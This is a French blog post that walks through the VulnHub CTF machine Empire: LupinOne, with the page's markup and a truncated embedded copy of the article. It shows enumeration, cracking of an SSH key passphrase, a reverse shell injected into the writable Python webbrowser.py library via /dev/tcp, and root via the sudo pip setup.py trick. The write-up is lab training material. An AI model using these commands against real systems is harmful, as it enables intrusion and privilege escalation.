<!DOCTYPE html>
<html data-html-server-rendered="true" lang="fr" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22fr%22%7D%7D">
  <head>
    <title>CTF Empire: LupinOne - https://etienner.github.io</title><meta name="gridsome:hash" content="b89929ffb278454bd1f8bb0277abaa50df9b43f7"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.14"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:type" content="article"><meta data-vue-tag="ssr" property="og:title" content="CTF Empire: LupinOne"><meta data-vue-tag="ssr" property="og:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:url" content="https://etienner.github.io/ctf-empire-lupin-one/"><meta data-vue-tag="ssr" name="twitter:domain" content="https://etienner.github.io"><meta data-vue-tag="ssr" name="twitter:card" content="summary_large_image"><meta data-vue-tag="ssr" name="twitter:title" content="CTF Empire: LupinOne"><meta data-vue-tag="ssr" name="twitter:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" name="twitter:site" content="@etiennerouzeaud"><meta data-vue-tag="ssr" name="twitter:creator" content="@etiennerouzeaud"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.9bb7ffafafc09ac851d81afb65b8ef59.png"><link rel="preload" href="/assets/css/0.styles.a80f6262.css" as="style"><link rel="preload" href="/assets/js/app.50d8a5ce.js" as="script"><link rel="preload" href="/assets/js/page--src-templates-post-vue.56e5bc07.js" as="script"><link rel="prefetch" href="/assets/js/page--node-modules-gridsome-app-pages-404-vue.5bf39404.js"><link rel="prefetch" href="/assets/js/page--src-pages-index-vue.027f19cb.js"><link rel="prefetch" href="/assets/js/page--src-templates-tag-vue.aae09759.js"><link rel="stylesheet" href="/assets/css/0.styles.a80f6262.css"><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
  </head>
  <body >
    <div data-server-rendered="true" id="app"><header class="py-2 text-center"><strong><a href="/" title="Accueil" class="active">Etienne ROUZEAUD - D√©veloppeur Web</a></strong></header><main><div class="title py-2 text-center" data-v-4b217994><h1 class="display-5 pt-2" data-v-4b217994>CTF Empire: LupinOne</h1><!----></div><div class="container"><div class="row sidebar"><div class="mt-4 col-lg-2"><p><em><span>07 novembre 2021</span></em></p><ul class="list-unstyled"><li>
            üè∑Ô∏è <a href="/tag/Pentest/">Pentest</a></li><li>
            üè∑Ô∏è <a href="/tag/CTF/">CTF</a></li></ul><p>‚åö 4 mins de lecture</p><p><a href="https://www.vulnhub.com/entry/empire-lupinone,750" target="_blank" rel="noopener">
            üíæ T√©l√©chargement
          </a></p></div><div class="col-lg-10 mt-4"><!----><article><h2>Avant propos</h2>
<p>Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.<br>
Ce CTF a √©t√© r√©alis√© avec une machine attaquante <strong>Kali 2021.3</strong> (<code class="language-text">lsb_release -r</code>).</p>
<h2>Enum√©ration</h2>
<p>On r√©cup√®re l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class="language-text">sudo netdiscover</code>.<br>
Avant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite <code class="language-text">export IP=192.168.1.38</code>.<br>
Puis on cr√©√© un dossier d√©di√© √† ce CTF <code class="language-text">cd Documents/ctf &amp;&amp; mkdir EmpireLupinOne &amp;&amp; cd EmpireLupinOne</code>.<br>
On lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nmap -sV -sT -p- <span class="token variable">$IP</span> -oN nmap.txt
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.48 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>On a un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur <strong>Apache</strong> 2.4.48 sur le port <strong>80</strong>.<br>
Dans le fichier "robots.txt", on trouve un indice.</p>
<div class="gridsome-highlight" data-language="txt"><pre style="counter-reset: linenumber NaN" class="language-txt line-numbers"><code class="language-txt">User-agent: *
Disallow: /~myfiles</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On va utiliser l'outil <strong>Ffuf</strong> au lieu de <strong>Wfuzz</strong> pour d√©couvrir le ou les pages pr√©sentes √† la racine du serveur Apache par mot clef.</p>
<p>Remarque: <strong>Ffuf</strong> n'est pas install√© par d√©faut sur <a href="https://www.kali.org/tools/ffuf" target="_blank" rel="nofollow noopener noreferrer">Kali Linux</a>. Il faut lancer la commande d'installation <code class="language-text">sudo apt install ffuf</code>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <span class="token string">'http://192.168.1.38/~FUZZ'</span>
secret</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On a une page "~secret" et un utilisateur potentiel "icex64".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash"><span class="token function">curl</span> http://<span class="token variable">$IP</span>/~secret/ 
<span class="token operator">&lt;</span>br<span class="token operator">></span>Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create <span class="token function">ssh</span> private key file,<span class="token operator">&lt;</span>/<span class="token operator">></span> 
<span class="token operator">&lt;</span>br<span class="token operator">></span>Its hided somewhere here, so that hackers dont <span class="token function">find</span> it and crack my passphrase with fasttrack.<span class="token operator">&lt;</span>/<span class="token operator">></span> 
<span class="token operator">&lt;</span>br<span class="token operator">></span>I'm smart I know that.<span class="token operator">&lt;</span>/<span class="token operator">></span>
<span class="token operator">&lt;</span>br<span class="token operator">></span>Any problem <span class="token builtin class-name">let</span> me know<span class="token operator">&lt;</span>/<span class="token operator">></span>
<span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">4</span>></span>Your best friend icex6<span class="token operator"><span class="token file-descriptor important">4</span>&lt;</span>/<span class="token operator">></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>En partant du principe que c'est un r√©pertoire secret, on cherche un fichier texte pr√©fix√© par un point.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <span class="token string">'http://192.168.1.38/~secret/.FUZZ'</span> -e .txt -fc <span class="token number">403</span>
mysecret.txt</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Le contenu de ce fichier contient une chaine de caract√®res qui se r√©v√®le √™tre du <a href="https://www.dcode.fr/identification-chiffrement" target="_blank" rel="nofollow noopener noreferrer">Base58</a> que l'on peut d√©chiffrer sur le m√™me site <a href="https://www.dcode.fr/chiffre-base-58" target="_blank" rel="nofollow noopener noreferrer">Dcode.fr</a>.</p>
<p>On a une clef SSH qui commence par <code class="language-text">-----BEGIN OPENSSH PRIVATE KEY-----</code> et se termine par <code class="language-text">-----END OPENSSH PRIVATE KEY-----</code> que l'on copie dans une nouveau fichier "id_rsa.pem" dont on change le chmod <code class="language-text">chmod 600 id_rsa.pem</code>.</p>
<p>Avec <strong>ssh2john</strong>, on copie le hash dans un nouveau fichier <code class="language-text">/usr/share/john/ssh2john.py id_rsa.pem &gt; hash</code> afin de trouver le mot de passe avec <strong>John the Ripper</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ john <span class="token builtin class-name">hash</span> --wordlist<span class="token operator">=</span>/usr/share/wordlists/fasttrack.txt
P@55w0rd<span class="token operator">!</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h2>P√©n√©tration</h2>
<p>On a l'utilisateur, la clef SSH et le mot de passe.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ssh</span> icex64@<span class="token variable">$IP</span> -i id_rsa.pem
password: P@55w0rd<span class="token operator">!</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Dans le r√©pertoire de l'utilisateur, on trouve le premier flag.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> user.txt
3mp<span class="token operator">!</span>r3<span class="token punctuation">{</span>I_See_That_You_Manage_To_Get_My_Bunny<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h2>Escalation</h2>
<p>Ensuite, on regarde les privil√®ges de l'utilisateur courant.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> -l
User icex64 may run the following commands on LupinOne:
    <span class="token punctuation">(</span>arsene<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>On peut ex√©cuter ce script Python avec l'utilisateur "arsene".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /home/arsene/heist.py 
<span class="token function">import</span> webbrowser

print <span class="token punctuation">(</span><span class="token string">"Its not yet ready to get in action"</span><span class="token punctuation">)</span>

webbrowser.open<span class="token punctuation">(</span><span class="token string">"https://empirecybersecurity.co.mz"</span><span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Le script ne contient quasiment rien, si ce n'est la librairie "webbrowser". Sur le <a href="https://github.com/python/cpython/blob/3.10/Lib/webbrowser.py" target="_blank" rel="nofollow noopener noreferrer">Github</a> de cette librarie, on voit que la librairie "Os" est utilis√©e. On va donc modifier cette derni√®re (on n'a pas les droit d'√©criture sur le script final) afin d'ex√©cuter un webshell.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">find</span> / -name webbrowser.py
/usr/lib/python3.9/webbrowser.py
-rwxrwxrwx <span class="token number">1</span> root root <span class="token number">24087</span> Oct  <span class="token number">4</span> <span class="token number">18</span>:45 /usr/lib/python3.9/webbrowser.py
$ <span class="token function">nano</span> /usr/lib/python3.9/webbrowser.py
os.system<span class="token punctuation">(</span><span class="token string">"/bin/bash -c '/bin/bash -i >&amp; /dev/tcp/192.168.1.33/1234 0>&amp;1'"</span><span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Dans un autre onglet du terminal, on d√©marre le serveur <strong>Netcat</strong> sur le port "1234".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">nc</span> -lnvp <span class="token number">1234</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">1234</span> <span class="token punctuation">..</span>.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Puis on ex√©cute le script Python <code class="language-text">sudo -u arsene python3.9 /home/arsene/heist.py</code> et la connexion est effective avec l'utilisateur "arsene".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> -l
User arsene may run the following commands on LupinOne:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/pip</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>L'utilisateur a le droit d'√©x√©cuter le gestionnaire de paquets de Python, <strong>PIP</strong>.</p>
<p>Avant tout, il faut se mettre en Shell <code class="language-text">python3 -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code> pour pouvoir effectuer les commandes recommand√©es par <a href="https://gtfobins.github.io/gtfobins/pip/#sudo" target="_blank" rel="nofollow noopener noreferrer">GTFOBins</a></p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp -d<span class="token variable">)</span></span>
$ <span class="token builtin class-name">echo</span> <span class="token string">"import os; os.execl('/bin/bash', 'bash', '-c', 'bash &lt;<span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span> ><span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span> 2><span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span>')"</span> <span class="token operator">></span> <span class="token variable">$TF</span>/setup.py
$ <span class="token function">sudo</span> pip <span class="token function">install</span> <span class="token variable">$TF</span>
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On est bien en root et on trouve le dernier flag.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /root/root.txt
3mp<span class="token operator">!</span>r3<span class="token punctuation">{</span>congratulations_you_manage_to_pwn_the_lupin1_box<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
</article></div></div></div></main><footer class="text-white mt-4"><ul class="nav nav-pills justify-content-center"><li><a href="https://github.com/etienner" target="_blank" rel="noopener" class="nav-link">Github</a></li><li><a href="https://medium.com/@etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Medium</a></li><li><a href="https://twitter.com/etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Twitter</a></li></ul></footer></div>
    <script>window.__INITIAL_STATE__={"data":{"post":{"title":"CTF Empire: LupinOne","date":"7 November 2021","content":"\u003Ch2\u003EAvant propos\u003C\u002Fh2\u003E\n\u003Cp\u003ELe d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.\u003Cbr\u003E\nCe CTF a √©t√© r√©alis√© avec une machine attaquante \u003Cstrong\u003EKali 2021.3\u003C\u002Fstrong\u003E (\u003Ccode class=\"language-text\"\u003Elsb_release -r\u003C\u002Fcode\u003E).\u003C\u002Fp\u003E\n\u003Ch2\u003EEnum√©ration\u003C\u002Fh2\u003E\n\u003Cp\u003EOn r√©cup√®re l'adresse IP de la machine distante avec \u003Cstrong\u003ENetdiscover\u003C\u002Fstrong\u003E \u003Ccode class=\"language-text\"\u003Esudo netdiscover\u003C\u002Fcode\u003E.\u003Cbr\u003E\nAvant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite \u003Ccode class=\"language-text\"\u003Eexport IP=192.168.1.38\u003C\u002Fcode\u003E.\u003Cbr\u003E\nPuis on cr√©√© un dossier d√©di√© √† ce CTF \u003Ccode class=\"language-text\"\u003Ecd Documents\u002Fctf &amp;&amp; mkdir EmpireLupinOne &amp;&amp; cd EmpireLupinOne\u003C\u002Fcode\u003E.\u003Cbr\u003E\nOn lance \u003Cstrong\u003ENmap\u003C\u002Fstrong\u003E pour scanner les ports de la machine distante.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ nmap -sV -sT -p- \u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -oN nmap.txt\nPORT   STATE SERVICE VERSION\n\u003Cspan class=\"token number\"\u003E22\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E     OpenSSH \u003Cspan class=\"token number\"\u003E8\u003C\u002Fspan\u003E.4p1 Debian \u003Cspan class=\"token number\"\u003E5\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eprotocol \u003Cspan class=\"token number\"\u003E2.0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E80\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  http    Apache httpd \u003Cspan class=\"token number\"\u003E2.4\u003C\u002Fspan\u003E.48 \u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token punctuation\"\u003E((\u003C\u002Fspan\u003EDebian\u003Cspan class=\"token punctuation\"\u003E))\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn a un serveur \u003Cstrong\u003ESSH\u003C\u002Fstrong\u003E sur le port \u003Cstrong\u003E22\u003C\u002Fstrong\u003E et un serveur \u003Cstrong\u003EApache\u003C\u002Fstrong\u003E 2.4.48 sur le port \u003Cstrong\u003E80\u003C\u002Fstrong\u003E.\u003Cbr\u003E\nDans le fichier \"robots.txt\", on trouve un indice.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"txt\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"\u003E\u003Ccode class=\"language-txt\"\u003EUser-agent: *\nDisallow: \u002F~myfiles\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn va utiliser l'outil \u003Cstrong\u003EFfuf\u003C\u002Fstrong\u003E au lieu de \u003Cstrong\u003EWfuzz\u003C\u002Fstrong\u003E pour d√©couvrir le ou les pages pr√©sentes √† la racine du serveur Apache par mot clef.\u003C\u002Fp\u003E\n\u003Cp\u003ERemarque: \u003Cstrong\u003EFfuf\u003C\u002Fstrong\u003E n'est pas install√© par d√©faut sur \u003Ca href=\"https:\u002F\u002Fwww.kali.org\u002Ftools\u002Fffuf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003EKali Linux\u003C\u002Fa\u003E. Il faut lancer la commande d'installation \u003Ccode class=\"language-text\"\u003Esudo apt install ffuf\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ ffuf -w \u002Fusr\u002Fshare\u002Fwordlists\u002Fdirbuster\u002Fdirectory-list-2.3-medium.txt -u \u003Cspan class=\"token string\"\u003E'http:\u002F\u002F192.168.1.38\u002F~FUZZ'\u003C\u002Fspan\u003E\nsecret\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn a une page \"~secret\" et un utilisateur potentiel \"icex64\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E\u003Cspan class=\"token function\"\u003Ecurl\u003C\u002Fspan\u003E http:\u002F\u002F\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E\u002F~secret\u002F \n\u003Cspan class=\"token operator\"\u003E&lt;\u003C\u002Fspan\u003Ebr\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003EHello Friend, Im happy that you found my secret diretory, I created like this to share with you my create \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E private key file,\u003Cspan class=\"token operator\"\u003E&lt;\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \n\u003Cspan class=\"token operator\"\u003E&lt;\u003C\u002Fspan\u003Ebr\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003EIts hided somewhere here, so that hackers dont \u003Cspan class=\"token function\"\u003Efind\u003C\u002Fspan\u003E it and crack my passphrase with fasttrack.\u003Cspan class=\"token operator\"\u003E&lt;\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \n\u003Cspan class=\"token operator\"\u003E&lt;\u003C\u002Fspan\u003Ebr\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003EI'm smart I know that.\u003Cspan class=\"token operator\"\u003E&lt;\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token operator\"\u003E&lt;\u003C\u002Fspan\u003Ebr\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003EAny problem \u003Cspan class=\"token builtin class-name\"\u003Elet\u003C\u002Fspan\u003E me know\u003Cspan class=\"token operator\"\u003E&lt;\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token operator\"\u003E&lt;\u003C\u002Fspan\u003Eh\u003Cspan class=\"token operator\"\u003E\u003Cspan class=\"token file-descriptor important\"\u003E4\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003EYour best friend icex6\u003Cspan class=\"token operator\"\u003E\u003Cspan class=\"token file-descriptor important\"\u003E4\u003C\u002Fspan\u003E&lt;\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EEn partant du principe que c'est un r√©pertoire secret, on cherche un fichier texte pr√©fix√© par un point.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ ffuf -w \u002Fusr\u002Fshare\u002Fwordlists\u002Fdirbuster\u002Fdirectory-list-2.3-medium.txt -u \u003Cspan class=\"token string\"\u003E'http:\u002F\u002F192.168.1.38\u002F~secret\u002F.FUZZ'\u003C\u002Fspan\u003E -e .txt -fc \u003Cspan class=\"token number\"\u003E403\u003C\u002Fspan\u003E\nmysecret.txt\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ELe contenu de ce fichier contient une chaine de caract√®res qui se r√©v√®le √™tre du \u003Ca href=\"https:\u002F\u002Fwww.dcode.fr\u002Fidentification-chiffrement\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003EBase58\u003C\u002Fa\u003E que l'on peut d√©chiffrer sur le m√™me site \u003Ca href=\"https:\u002F\u002Fwww.dcode.fr\u002Fchiffre-base-58\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003EDcode.fr\u003C\u002Fa\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EOn a une clef SSH qui commence par \u003Ccode class=\"language-text\"\u003E-----BEGIN OPENSSH PRIVATE KEY-----\u003C\u002Fcode\u003E et se termine par \u003Ccode class=\"language-text\"\u003E-----END OPENSSH PRIVATE KEY-----\u003C\u002Fcode\u003E que l'on copie dans une nouveau fichier \"id_rsa.pem\" dont on change le chmod \u003Ccode class=\"language-text\"\u003Echmod 600 id_rsa.pem\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EAvec \u003Cstrong\u003Essh2john\u003C\u002Fstrong\u003E, on copie le hash dans un nouveau fichier \u003Ccode class=\"language-text\"\u003E\u002Fusr\u002Fshare\u002Fjohn\u002Fssh2john.py id_rsa.pem &gt; hash\u003C\u002Fcode\u003E afin de trouver le mot de passe avec \u003Cstrong\u003EJohn the Ripper\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode 